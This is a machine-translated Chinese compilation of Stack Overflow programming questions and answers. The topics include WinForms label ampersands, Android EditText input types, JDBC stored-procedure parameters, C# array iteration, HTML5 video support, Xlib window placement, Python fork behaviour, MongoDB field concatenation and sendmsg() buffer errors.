编辑#1，结果表明 MessageBox 确实显示了 &。加载到的对象也包含 & 符号。即使是显示符号的标签也在其 .Text 属性中包含 & 符号，例如。myLabel.Text == “我和你”。但屏幕上的显示仍然显示我是你。所以这个问题与SQL无关，而只是与Winforms有关，我可能会很快删除这个问题，除非其他人经历过这个并且可以提供一些见解来加快我的故障排除

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:19:35.360

我的猜测是，**`&`**当您使用 WinForms 时，它被用作特殊字符**`Label`**。

在哪里：

> 我你

变成

![在此处输入图像描述](../Images/32974f033c66f14a991f0b8ff0a3e68b.png)

和

> 我你

变成

![在此处输入图像描述](../Images/24254f7fb636317695144c159cf8e4a4.png)

但这不适用于`MessageBox.Show`

* * *

[如果是标签：](https://stackoverflow.com/a/4325107/12597)

*   使用另一个 & 符号 (&&) 转义它

*   将该标签设置[`UseMnemonic`](http://msdn.microsoft.com/en-us/library/system.windows.forms.label.usemnemonic.aspx)为**false**，然后该标签的所有＆符号将按字面意思使用，您不需要将它们加倍（尽管您会丢失下划线/访问键功能）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:24:28.583

```
myTable.myColumn =" Me & You";

string testString="";
SQLConnection con = new SQLConnection(...)
SQLCommand command=new SQLCommand("Select Top 1 * from myTable",con)
SQLDataReader reader= command.ExecuteQuery()
while (reader.read())
{
    testString=reader["myColumn"].ToString().Replace("&","&&");
    MessageBox.Show(testString);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:21:25.650

要使用对操作系统具有特殊含义的字符，例如“和”符号 (&) 或分号 (;)，请将字符括在引号 (") 中。分隔列可以是 n ' 任何 8 位字符。

# android - 如何更改android Edit Tex中的输入值？

> ID：12820216
> 
> 赞同：-1
> 
> 时间：2012-10-10T13:13:25.253
> 
> 标签：android, android-edittext

我`586785865858586`在 android 编辑文本中输入，但值被转换为`5.8678585E17`。但我需要我提供的相同输入。请任何人帮助我

我的xml代码

```
 <EditText
            android:id="@+id/etOpenText"
            android:layout_width="fill_parent"
            android:layout_height="120dp"
            android:layout_marginTop="10dp"
            android:gravity="top"
            android:inputType="numberDecimal"
            android:visibility="gone" >
        </EditText> 
```

Java 代码

```
String s=edittext.getText().tostring(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:09:14.060

您正在告诉编辑文本它应该期望一个数字。只需让它期待一个字符串。

```
<EditText
android:id="@+id/myNumber"
android:digits="0123456780."
android:inputType="text"
/> 
```

安卓：数字=“0123456780。” 将输入限制为这些数字。您可能必须将输入类型更改为 numberDecimal

如果你想在幕后做替身：

```
double d = Double.parseDouble(textview.getText().toString(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T14:12:05.470

您可以尝试将您的 xml 修改为

```
<EditText android:id="@+id/etOpenText" 
 android:layout_width="fill_parent"  
 android:layout_height="120dp" 
 android:layout_marginTop="10dp" 
 android:gravity="top" 
 android:inputType="number" 
 android:visibility="gone" /> 
```

或者

```
<EditText android:id="@+id/etOpenText" 
 android:layout_width="fill_parent"  
 android:layout_height="120dp" 
 android:layout_marginTop="10dp" 
 android:gravity="top" 
 android:digits="0123456780"
 android:inputType="text"
 android:visibility="gone" /> 
```

为了取回价值并将其用作您可以做的价值

```
double value = Double.parseDouble(edittext.getText()); 
```

# java - Java 存储过程未执行

> ID：12820219
> 
> 赞同：0
> 
> 时间：2012-10-10T13:13:35.357
> 
> 标签：java, jdbc, sap-ase

我的 java 代码中有一个存储过程调用，它使用 sybase 数据库，如下所示：

```
CallableStatement cstmt=sigmaConnection.prepareCall("{call dbo.sp_insRadEntry(?, ?, ?, ?, ?, ?, ?)}");
cstmt.setString(1,"Nappa");
cstmt.setInt(2,40);
cstmt.setString(3,"Vegeta");
cstmt.setString(4,"Saiyan");
cstmt.setString(7,"Hello"); 

cstmt.execute(); 
```

如您所见，我故意不设置第 5 和第 6 个参数，因为如果未传递任何值并且在此调用中调用 dbo.sp_insRadEntry(?, ?, ?, ?, ?, ?, ? ) 我有 7 个参数，因为它不允许我在没有 7 个逗号的情况下设置第 7 个参数。

但是即使我已经设置了第四个参数，我也会遇到以下异常：

'java.sql.SQLException：JZ0SA：Prepared Statement：未设置输入参数，索引：4。'

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T14:22:06.043

I'm not sure this will work in your DB, but what about omitting the question marks for the parameters you don't want to specify? That is:

```
CallableStatement cstmt=sigmaConnection.prepareCall(
        "{call dbo.sp_insRadEntry(?, ?, ?, ?, , , ?)}");
cstmt.setString(1,"Nappa");
cstmt.setInt(2,40);
cstmt.setString(3,"Vegeta");
cstmt.setString(4,"Saiyan");
cstmt.setString(5,"Hello"); 

cstmt.execute(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:17:33.610

看起来“索引 4”是指第五个参数（索引从零开始），所以我认为问题在于您的代码无法识别默认参数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:20:44.997

您也应该尝试使用 setNull 方法设置缺少的第 5 个和第 6 个参数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T13:27:00.160

您还需要在索引 5 和 6 处设置值

```
int type = TYPE
pst.setNull(index, type); 
```

类型参考这里： [http ://www.tutorialspoint.com/jdbc/jdbc-data-types.htm](http://www.tutorialspoint.com/jdbc/jdbc-data-types.htm)

**编辑：** 如果你有 Not Null 约束，你没有办法，只能在读取数据时忽略的那些位置设置一些虚拟或空白值（ehh ..必须为该检查编写一些额外的代码），如果你真的没有想要这样做，那么为什么首先要设置 Not Null 约束呢？:-)

# c# - 如何一次迭代3个数组

> ID：12820230
> 
> 赞同：1
> 
> 时间：2012-10-10T13:14:06.220
> 
> 标签：c#, asp.net, foreach

我有 3 个包含不同信息的数组。第一个数组包含一堆 id，第二个数组包含一堆日期，第三个数组包含一堆名称。

我知道这是一个简单的问题，但我不记得该怎么做，所以我为愚蠢道歉。

3 个数组如下所示：

```
string[] eventIDs = EventID.Split(',');
        string[] eventDates = eventCopyDate.Split(',');
        string[] invNames = investigatorNames.Split(','); 
```

这些值看起来像“john Doe，Mark Doe，Tim Doe”，因此为什么 .Split 我在这里尝试了嵌套的 for 循环但没有成功。

```
foreach (var id in eventIDs)
        {
            foreach (var date in eventDates)
            {
                foreach (var name in invNames)
                {
                    cmd.Parameters.Add(new SqlParameter("@EventID", SqlDbType.Int));
                    cmd.Parameters["@EventID"].Value = int.Parse(id);

                    cmd.Parameters.Add(new SqlParameter("@InvestigatorName", SqlDbType.NVarChar));
                    cmd.Parameters["@InvestigatorName"].Value = name;

                    cmd.Parameters.Add(new SqlParameter("@CopyDate", SqlDbType.DateTime));
                    cmd.Parameters["@CopyDate"].Value = Convert.ToDateTime(date);

                }//end name foreach

            }//end date foreach
        }//end id foreach 
```

我知道这只会在返回第二个嵌套数组之前先遍历整个数组。我正在尝试迭代到数组中的第一个值，将它们分配给变量，然后进行第二次迭代。

这样 arrayNames:"john Doe, Mark Doe" arrayDates"12/12/12, 10/12/12" 和 arrayID:"234,235,236" 将像这样使用：

```
"john Doe" "12/12/12" "234"
"Mark Doe" "10/12/12" "235" 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-10T13:16:09.457

使用`for`具有唯一索引的循环，假设 3 个三个数组具有相同的大小。

```
string[] eventIDs = EventID.Split(',');
string[] eventDates = eventCopyDate.Split(',');
string[] invNames = investigatorNames.Split(',');

for(int i=0; i<eventIDs.Length;i++) {
    var id = eventIDs[i];
    var date = eventDates[i];
    var name = invNames[i];
    cmd.Parameters.Add(new SqlParameter("@EventID", SqlDbType.Int));
    cmd.Parameters["@EventID"].Value = int.Parse(id);

    cmd.Parameters.Add(new SqlParameter("@InvestigatorName", SqlDbType.NVarChar));
    cmd.Parameters["@InvestigatorName"].Value = name;

    cmd.Parameters.Add(new SqlParameter("@CopyDate", SqlDbType.DateTime));
    cmd.Parameters["@CopyDate"].Value = Convert.ToDateTime(date);
} 
```

如果你真的想要一个 foreach，你可以写这个，但在我看来它的可读性较差：

```
var assembled = Enumerable.Range(0, eventIDs.Length).Select(i=> new { id=eventIDs[i], name=invName[i], date=eventDates[i] } );

foreach(var value in assembled){

    cmd.Parameters.Add(new SqlParameter("@EventID", SqlDbType.Int));
    cmd.Parameters["@EventID"].Value = int.Parse(value.id);

    cmd.Parameters.Add(new SqlParameter("@InvestigatorName", SqlDbType.NVarChar));
    cmd.Parameters["@InvestigatorName"].Value = value.name;

    cmd.Parameters.Add(new SqlParameter("@CopyDate", SqlDbType.DateTime));
    cmd.Parameters["@CopyDate"].Value = Convert.ToDateTime(value.date);

} 
```

但我更喜欢第一个解决方案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:16:01.520

使用 for 循环迭代 N 次，其中 N 是所有三个数组的长度（它们必须是相同的大小）。使用循环变量来索引所有这些。

或者，您可以压缩数组，但与简单的 for 循环相比，这将非常复杂和尴尬。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-10T13:18:18.260

不要使用`foreach`，只需使用普通`for`循环并使用您的索引来引用您的数组。

```
for (int i = 0; i < eventIDs.Length; i++)
{
    string eventID = eventIDs[i];
    string eventDate = eventDates[i];
    string invName = invNames[i];
} 
```

这假设三个数组都是等长的。如果不是这种情况，那么它会稍微复杂一些。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-10T13:21:12.293

你可以使用[`Enumerable.Zip`](http://msdn.microsoft.com/en-us/library/dd267698.aspx)：

```
foreach(var data in eventIDs.Zip(eventDates,
                                 (x, y) => new { EventID = x, EventDate = y })
                            .Zip(invNames,
                                 (x, y) => new { EventID = x.EventID,
                                                 EventDate = x.EventDate,
                                                 InvName = y }))
{

    cmd.Parameters.Add(new SqlParameter("@EventID", SqlDbType.Int));
    cmd.Parameters["@EventID"].Value = int.Parse(data.EventID);

    cmd.Parameters.Add(new SqlParameter("@InvestigatorName", SqlDbType.NVarChar));
    cmd.Parameters["@InvestigatorName"].Value = data.InvName;

    cmd.Parameters.Add(new SqlParameter("@CopyDate", SqlDbType.DateTime));
    cmd.Parameters["@CopyDate"].Value = Convert.ToDateTime(data.EventDate);

} 
```

这看起来有点复杂，但它的优点是即使数组的长度不同，它也可以毫无问题地工作。
老实说，我不认为我更喜欢这种方法而不是更简单的 for 循环。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-10T13:18:07.070

您需要按索引进行迭代（如果您确定它们的大小相同）：

```
for(int i = 0; i < eventIDs.Length; i++)
{
    var id = eventIDs[i];
    var date = eventDates[i];
    var name = invNames[i];
} 
```

# html - HTML5 视频属性支持

> ID：12820232
> 
> 赞同：0
> 
> 时间：2012-10-10T13:14:12.203
> 
> 标签：html, video, attributes

我有一个 HTML5 视频，工作正常，每当我启动浏览器时，我都会开心地微笑……但是！

我知道某些浏览器不支持 Video 标签，但我注意到对视频属性/methods/whatever**的支持也存在差异。**在某处有这个总结吗？

**例如：** poster 属性并非在每个浏览器中都有效，即使视频确实有效！

我认为仅使用整个 javascript 库来处理像海报这样的属性是毫无价值的，那么**如何处理**呢？还是我完全错了，是否支持 IF 视频，每个属性也都支持相同的方式？

请帮我！:)

感谢您的所有建议，WK

ps：我正在为视频的每个人使用视频。所以那工作正常。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:21:35.210

这是你追求的那种东西吗？[点击我](http://en.wikipedia.org/wiki/HTML5_video#Browser_support)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:21:48.023

基本上对 HTML5 video 标签有以下支持：

1.  每个现代浏览器都支持`HTML 5`支持`<video>` 含义：IE9+、FF3.6+、Chrome、Opera、Safari
2.  Internet Explorer 9 不支持海报属性。我相信微软连接上什至有一个关于这个的错误。
3.  Firefox 不支持循环属性。（完成后重播视频）
4.  不同的浏览器支持不同的视频格式，IE9 支持 H.264，Firefox 支持 ogg (Theora) 和 WebM 等，这意味着您需要提供所有格式才能兼容所有浏览器。

其余的几乎在所有地方都得到了支持。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T13:26:18.520

好吧，HTML 5 还没有标准化。因此，每个支持 html5 的浏览器的工作方式都不同。就视频标签而言，您必须提供不同的格式才能获得各种浏览器列表的支持。[您可以在此站点](http://html5test.com/)上测试浏览器支持。在这里，您可以获得有关您的浏览器对 HTML5 的支持程度的所有详细信息

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T13:23:41.997

我发现这个页面是一个很好的资源（尽管它开始像今年早些时候一样变老了）：[http ://www.longtailvideo.com/html5](http://www.longtailvideo.com/html5)

另外，我发现如果您使用 Android 等移动设备，每个设备的浏览器支持差异很大。即使它们受到“支持”，我总是会出现奇怪的行为。

至于海报，如果您想获得所有浏览器的支持，没有好的解决方案。

# c - Xlib：窗口创建在错误的位置

> ID：12820233
> 
> 赞同：1
> 
> 时间：2012-10-10T13:14:12.767
> 
> 标签：c, xlib

我有创建窗口的简单 xlib 程序。我认为它必须在屏幕的左上角显示窗口，因为我将 0, 0 传递给 XCreateSimpleWindow 函数，但它位于中上侧。为什么 ？

```
#include <X11/Xlib.h>
#include <stdio.h>
#include <stdlib.h>     

int
main(int argc, char* argv[])
{
  Display* display;     
  int screen_num;       
  Window win;           
  unsigned int display_width,display_height;    
  unsigned int width, height;   
  char *display_name = getenv("DISPLAY");

  display = XOpenDisplay(display_name);
  screen_num = DefaultScreen(display);
  display_width = DisplayWidth(display, screen_num);
  display_height = DisplayHeight(display, screen_num);

  width = (display_width / 3);
  height = (display_height / 3);

  win = XCreateSimpleWindow(display, RootWindow(display, screen_num), 0, 0, width, height, 1, BlackPixel(display, screen_num), WhitePixel(display, screen_num));

  XMapWindow(display, win);

  XSync(display, False);

  while(1) { }    
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:24:01.923

顶层窗口由窗口管理器放置（和尺寸），它可以做任何适合它的事情。通常尊重大小但不尊重位置（为了留下装饰的地方，为了尊重让工具栏清晰的放置策略，......）

如果您希望您的请求得到尊重，请尝试在没有窗口管理器的显示器上使用（使用 VNC 或类似方法来获得这样的显示器，不要尝试像这样使用您的桌面）

# three.js - 透明 collada 文件

> ID：12820236
> 
> 赞同：0
> 
> 时间：2012-10-10T13:14:33.210
> 
> 标签：three.js, dat.gui

我需要更改文件的透明度。Dae (collada)，通过我的库 Three.js 和 dat.gui 的代码。我正在使用： $gui = new DAT.GUI(); gui.add(opacity_pele, 'pele').onChange(function(){

```
 if ( opacity_pele.pele ) {
                    material[pele].transparency = 1.0;

                } else {
                    material[pele].transparency = 0.0;

                }

            });
           gui.close(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T08:39:15.300

您是否尝试过在您的 3D 编辑器程序中设置透明度？例如，在 Blender 中，您可以调整面板上对象的透明度（请参见下文）。我正在使用这种方法来显示透明对象，这对我来说非常有效。

![在此处输入图像描述](../Images/1d8d75046607c9611382833f73f8829d.png)

# python - 分叉后运行线程会发生什么？

> ID：12820248
> 
> 赞同：1
> 
> 时间：2012-10-10T13:15:09.943
> 
> 标签：python, multithreading, multiprocessing, openerp

我正在使用 OpenERP，一个基于 Python 的 ERP，它使用不同的线程（每个客户端一个线程等）。我想使用 multiprocessing.Process() 来 fork() 并调用一个长时间运行的方法。

我的问题是：父母的线程会发生什么？它们会被复制并继续运行吗？子进程会在服务器套接字上调用 accept() 吗？

谢谢你的回答，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:18:30.427

分叉不复制线程，只复制主线程。因此，在分叉多线程应用程序时*要非常小心*，因为它可能会导致不可预知的副作用（例如，当某个线程在互斥的关键部分中执行时发生分叉时），除非您知道您的代码，否则您的分叉进程中确实可能会被破坏。理想地分叉。

尽管我上面所说的一切都是正确的，但有一个名为 pthread_atfork() 的解决方法（至少在 Linux 上），它在进程被分叉时充当回调（您可以重新创建所有需要的线程）。尽管它适用于 C 应用程序，但不适用于 Python 应用程序。

如需更多信息，您可以参考：

*   关于这个问题的 Python 问题跟踪器 - [http://bugs.python.org/issue6923](http://bugs.python.org/issue6923)
*   在网上寻找类似想法的实现，例如：[http ://code.google.com/p/python-atfork/](http://code.google.com/p/python-atfork/)

# jquery - 如何在 Datatables 单元格上按 ENTER 之前绑定双击？

> ID：12820251
> 
> 赞同：1
> 
> 时间：2012-10-10T13:15:19.833
> 
> 标签：jquery, datatables, jeditable

我一直在研究一个网格控件，该控件使用 Datatables 的 KeyTable 插件。在这里和那里进行了一些调整，一切都很顺利，但是插件存在一个烦人的问题。以下是插件页面的示例代码：

```
$(document).ready( function () {
    var keys = new KeyTable( {
        "table": document.getElementById('example')
    } );

    /* Apply a return key event to each cell in the table */
    keys.event.action( null, null, function (nCell) {
        /* Block KeyTable from performing any events while jEditable is in edit mode */
        keys.block = true;

        /* Initialise the Editable instance for this table */
        $(nCell).editable( function (sVal) {
            /* Submit function (local only) - unblock KeyTable */
            keys.block = false;
            return sVal;
        }, {
            "onblur": 'submit',
            "onreset": function(){
                /* Unblock KeyTable, but only after this 'esc' key event has finished. Otherwise
                 * it will 'esc' KeyTable as well
                 */
                setTimeout( function () {keys.block = false;}, 0);
            }
        } );

        /* Dispatch click event to go into edit mode - Saf 4 needs a timeout... */
        setTimeout( function () { $(nCell).click(); }, 0 );
    } );
} ); 
```

据我所知，在按下返回键之前，单元格不会“可编辑”，之后现在附加了一个点击事件。有没有办法让我在点击返回之前将点击事件（在我的情况下我想要一个 dblclick）附加到单元格？我尝试将函数绑定到“td.focus”和“example td”，但没有成功。我希望每个单元格都响应加载中的 dblclick，但也响应键。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T22:40:28.550

您只需在要编辑的单元格上绑定双击事件并模拟返回键：

```
$('.cells').dblclick(function() {
    e = jQuery.Event("keypress");
    e.which = 13;
    e.keyCode = 13;
    $(this).trigger(e);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T02:54:52.487

我在表格单元格中添加了一个 dblclick 委托，但完成这项工作的关键是最后一行：

```
$('#' + tableID).delegate('tr td.focus', 'dblclick', function () {
        $(this).editable(updateURL, 
            {
             "callback": function (value, settings) {
                keys.block = false;
             },
             "onblur": 'submit',
             "onreset": function(){
                setTimeout( function () {keys.block = false;}, 0);
             }
            } 
        );
        $(this).dblclick();
    }); 
```

示例中显示的使用 setTimeout 函数的间接单击事件调用导致 jEditable 事件触发，因此我摆脱了它。只需直接调用 click 事件即可。

# mongodb - MongoDB 将两个字段中的字符串连接到第三个字段中

> ID：12820253
> 
> 赞同：23
> 
> 时间：2012-10-10T13:15:22.937
> 
> 标签：mongodb, mongodb-query, aggregation-framework, string-concatenation, mongodb-update

如何连接来自两个字符串字段的值并将其放入第三个字段？

我试过这个：

```
db.collection.update(
  { "_id": { $exists: true } },
  { $set: { column_2: { $add: ['$column_4', '$column_3'] } } },
  false, true
) 
```

但这似乎不起作用，并抛出`not ok for storage`.

我也试过这个：

```
db.collection.update(
  { "_id": { $exists : true } },
  { $set: { column_2: { $add: ['a', 'b'] } } },
  false, true
) 
```

但即使这样也显示了同样的错误`not ok for storage`。

我只想在 mongo 服务器上而不是在我的应用程序中连接。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2016-01-21T21:24:31.923

您可以使用聚合运算符[`$project`](https://docs.mongodb.org/v3.0/reference/operator/aggregation/project/)和[`$concat`](https://docs.mongodb.org/manual/reference/operator/aggregation/concat/)：

```
db.collection.aggregate([
  { $project: { newfield: { $concat: [ "$field1", " - ", "$field2" ] } } }
]) 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-10-10T21:48:59.210

不幸的是，MongoDB 目前不允许您在执行 update() 时引用任何字段的现有值。有一个现有的 Jira 票可以添加此功能：有关详细信息，请参阅[SERVER-1765](https://jira.mongodb.org/browse/SERVER-1765)。

目前，您必须进行初始查询以确定现有值，并在客户端中进行字符串操作。我希望我有一个更好的答案给你。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2019-10-04T01:10:01.747

您可以[`$set`](https://docs.mongodb.com/master/reference/command/update/index.html#update-command-example-agg)在 4.2 中这样使用，它支持更新中的聚合管道。

```
db.collection.update(
   {"_id" :{"$exists":true}},
   [{"$set":{"column_2":{"$concat":["$column_4","$column_3"]}}}]
) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2020-01-29T04:48:13.903

**

> 就我而言，这`$concat`对我有用...

**

```
db.collection.update( { "_id" : {"$exists":true} }, 
   [ { 
       "$set" : { 
                 "column_2" :  { "$concat" : ["$column_4","$column_3"] }
                }
      }
   ] 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-09-18T03:13:38.610

您也可以按照以下说明进行操作。

```
db.collectionName.find({}).forEach(function(row) { 
    row.newField = row.field1 + "-" + row.field2
    db.collectionName.save(row);
}); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-02-28T10:47:32.363

假设您有一个集合名称是“myData”，其中您有这样的数据

```
{
"_id":"xvradt5gtg",
"first_name":"nizam",
"last_name":"khan",
"address":"H-148, Near Hero Show Room, Shahjahanpur",
} 
```

并且您想要连接字段（名字+姓氏+地址）并将其保存到这样的“地址”字段中

```
{
"_id":"xvradt5gtg",
"first_name":"nizam",
"last_name":"khan",
"address":"nizam khan,H-148, Near Hero Show Room, Shahjahanpur",
} 
```

现在写查询将是

```
{
var x=db.myData.find({_id:"xvradt5gtg"});
x.forEach(function(d)
    { 
        var first_name=d.first_name;
        var last_name=d.last_name;
        var _add=d.address;  
        var fullAddress=first_name+","+last_name+","+_add; 
        //you can print also
        print(fullAddress); 
        //update 
        db.myData.update({_id:d._id},{$set:{address:fullAddress}});
    })
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-10-10T21:35:36.083

*根据@Jamby 的建议，以@rebe100x 的答案为基础...*

您可以在聚合管道中使用 $project、$concat 和 $out（或 $merge）。 [https://docs.mongodb.org/v3.0/reference/operator/aggregation/project/](https://docs.mongodb.org/v3.0/reference/operator/aggregation/project/) [https://docs.mongodb.org/manual/reference/operator/aggregation/concat/](https://docs.mongodb.org/manual/reference/operator/aggregation/concat/) [https://docs.mongodb。 com/manual/reference/operator/aggregation/out/](https://docs.mongodb.com/manual/reference/operator/aggregation/out/)

例如：

```
 db.collection.aggregate(
       [
          { $project: { newfield: { $concat: [ "$field1", " - ", "$field2" ] } } },
          { $out: "collection" }
       ]
    ) 
```

**使用 MongoDB 4.2 。. .**

MongoDB 4.2 添加了 $merge 管道阶段，它提供了对集合*中文档的选择性替换*，而 $out 将*替换整个集合*。您还可以选择合并而不是替换目标文档。

```
 db.collection.aggregate(
       [
          { $project: { newfield: { $concat: [ "$field1", " - ", "$field2" ] } } },
          { $merge: { into: "collection", on: "_id", whenMatched: "merge", whenNotMatched: "discard" }
       ]
    ) 
```

在 $merge 和 $out 之间进行选择时，您应该考虑性能、并发性和一致性之间的权衡，因为 $out 将通过临时集合和重命名**自动执行集合替换。**

[https://docs.mongodb.com/manual/reference/operator/aggregation/merge/](https://docs.mongodb.com/manual/reference/operator/aggregation/merge/) [https://docs.mongodb.com/manual/reference/operator/aggregation/merge/#merge-out-comparison](https://docs.mongodb.com/manual/reference/operator/aggregation/merge/#merge-out-comparison)

# java - 如何将字符串数组转换为字节缓冲区类型？

> ID：12820255
> 
> 赞同：0
> 
> 时间：2012-10-10T13:15:23.673
> 
> 标签：java, byte, bytebuffer

我有一个字符串数组，我想将其转换为 ByteBuffer 类型。我现在正在使用此代码，但我不确定它是否正确。 `ByteBuffer.wrap(values.toString().getBytes())`

请让我知道这是否是我正在做的正确格式。`values`这里是一个字符串数组。

谢谢

# c - C sendmsg() 没有可用的缓冲区空间

> ID：12820256
> 
> 赞同：6
> 
> 时间：2012-10-10T13:15:28.743
> 
> 标签：c

我不是 C 编程方面的专家，但我正在尝试使用 sendmsg() 和 recvmsg() 编写一个相当简单的程序，以便在客户端和服务器之间发送消息（两者都在同一台机器上，所以基本上我'正在向本地主机发送消息）。

在初始化所需的结构（如在 iovec 和 msghdr 中）并成功将客户端连接到服务器后，我的 sendmsg() 调用失败并出现“没有可用的缓冲区空间”错误。

这是 linux man 报告的有关此类错误的内容：

> 网络接口的输出队列已满。这一般表示接口已经停止发送，但可能是暂时拥塞造成的。（通常，这在 Linux 中不会发生。当设备队列溢出时，数据包会被静默丢弃。）

我在互联网上四处寻找，结果发现 sendmsg() 没有被广泛使用，没有人能与这种类型的错误联系起来。我发现的唯一有用的建议是检查可能过多的打开套接字，但我总是关闭我创建的每个套接字。

所以我被困住了，基本上是因为我是个菜鸟，我不知道该去哪里解决这类问题。

如果有人知道如何进行，那就太好了。（请不要告诉我不要使用 sendmsg()，因为我工作的全部目的是理解这个系统调用，而不是向自己发送消息）

这是迄今为止我在 pastebin 上编写的代码：[客户端](http://pastebin.com/RESELfvv)和[服务器](http://pastebin.com/wfGUcHvP)

- 解决了 -

非常感谢你。我已经能够解决这个问题并修复了我犯的其他错误，所以这里是 sendmsg() 和 recvmsg() 工作消息传递的功能代码：[客户端](http://pastebin.com/nze9gznA)和[服务器](http://pastebin.com/vcmspYCY)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T14:16:47.180

正如其他人指出的那样， iovlen 应该是 1。但是，您希望在初始化 mh 的某些字段之前将其清零，因为您可能在未初始化的字段中发送垃圾并且系统调用会混淆。此外，设置 msg_name 和 msg_namelen 并没有什么意义，因为您已连接并且无论如何都无法改变将数据发送到何处的想法。

这在您的客户端代码中对我有用：

```
/* The message header contains parameters for sendmsg.    */
memset(&mh, 0, sizeof(mh));                                                                                                                                                                                                                                                                          
mh.msg_iov = iov;
mh.msg_iovlen = 1;

printf("mh structure initialized \n"); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-10T14:11:25.943

该`msg_iovlen`字段包含*iov*数组中元素的数量，而不是其大小（以字节为单位）。

系统将以下未初始化的内存解释为*iov*元素，最终得到的数据包大于可用的套接字缓冲区空间，因此拒绝发送数据。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-10T14:13:25.653

好的，所以在你的代码中我发现了这个：

```
mh.msg_iovlen = sizeof(iov); 
```

它将`msg_iovlen`成员设置为`struct iovec`. 但是文档说明了这个领域：

> size_t msg_iovlen; /* # msg_iov 中的元素 */

所以你的代码是错误的，它告诉`sendmsg()`它发送的元素比你实际初始化的要多。

# silverlight - CSS3 水平下拉菜单和 Microsoft Silverlight 兼容性...鼠标悬停/悬停问题

> ID：12820258
> 
> 赞同：0
> 
> 时间：2012-10-10T13:15:46.857
> 
> 标签：silverlight, css, drop-down-menu, internet-explorer-9, mouseover

我正在尝试在我正在开发的仍在建设中的网站上部署基于 CSS3 的水平导航菜单。

将鼠标悬停或鼠标悬停在菜单标题之一上，将出现一个下拉菜单。将鼠标移出标题或下拉项目列表，菜单将折叠。因此，只要可以“看到”鼠标指针，项目的下拉列表就会保持打开状态。

该菜单具有容器，允许呈现来自站点甚至其他站点的内容。例如，它可以显示图像或整个网页。我正在尝试显示使用 Microsoft 的 Silverlight 平台创建的对象。该对象嵌入在我网站的另一个页面上，并且通过 php include，它与我测试过的所有浏览器中的菜单配合得很好……除了 Microsoft Internet Explorer 9。（还没有尝试过 IE10。）

在 IE9 的情况下，Silverlight 对象按预期显示，但只要鼠标接触到显示的 Silverlight 对象，下拉菜单就会折叠。即，CSS3 菜单看不见鼠标，当鼠标指针接触到 Silverlight 对象时，下拉菜单就会崩溃。

我还没有找到太多的帮助方式。

非常感谢任何想法或指导。谢谢。

# tags - Floodlight 和 Google 跟踪代码管理器

> ID：12820263
> 
> 赞同：4
> 
> 时间：2012-10-10T13:16:03.360
> 
> 标签：tags, containers, pixel, google-tag-manager

使用 Google 跟踪代码管理器（一种像素容器）与使用 Floodlight 代码有何不同？

跟踪代码管理器实际上是一个容器，可以根据需要加载自定义跟踪代码，而 Floodlight 代码是**跟踪**代码。但据我所知，自定义代码的加载可以通过 Floodlight 本地完成，方法是使用他们所谓的“动态”代码。

[Floodlight 动态代码](https://support.google.com/dfa/partner/bin/answer.py?hl=en&answer=186743&topic=28820&ctx=topic)
[Google 跟踪代码管理器](http://support.google.com/tagmanager/bin/answer.py?hl=en&answer=2574305&topic=2574303&ctx=topic)

干杯!

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-17T16:43:10.547

以下是[Google 跟踪代码管理器常见问题解答](https://www.google.com.au/tagmanager/faq.html)的答案：

> 如今，许多 DoubleClick 客户将 Floodlight 用作容器代码以及转化跟踪和再营销代码。由于 Google 跟踪代码管理器提供了更通用的代码管理技术，我们鼓励所有 Floodlight 用户安装 Google 跟踪代码管理器，并使用内置的 Floodlight 模板将他们现有的 Floodlight 代码迁移到 Google 跟踪代码管理器中。这将使添加未来的 Floodlight 代码变得更加容易，并且可以更快地收集变量并减少出错的可能性。
> 
> 请务必注意，Google 跟踪代码管理器不会取代 Floodlight 代码的转化跟踪和再营销功能。DoubleClick 用户应继续使用 Floodlight 来获得这些功能。由于 Google 跟踪代码管理器具有更复杂的容器功能，我们还鼓励 Floodlight 用户将默认代码部分中的代码迁移到 Google 跟踪代码管理器中，但将代码保留在 Floodlight 中的发布商代码部分中，以利用最终点击和浏览型标签触发。

这是否回答你的问题？如果没有，请告诉我，我很乐意回答任何后续问题。

干杯，劳拉

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-07-31T17:52:34.593

最容易将 GTM 视为传递标签的机制，但标签本身就是“内容”。

默认情况下，Floodlight (FLC) 代码会在网页浏览中加载。但随着时间的推移，您可能会发现 FLC 限制的这个元素。

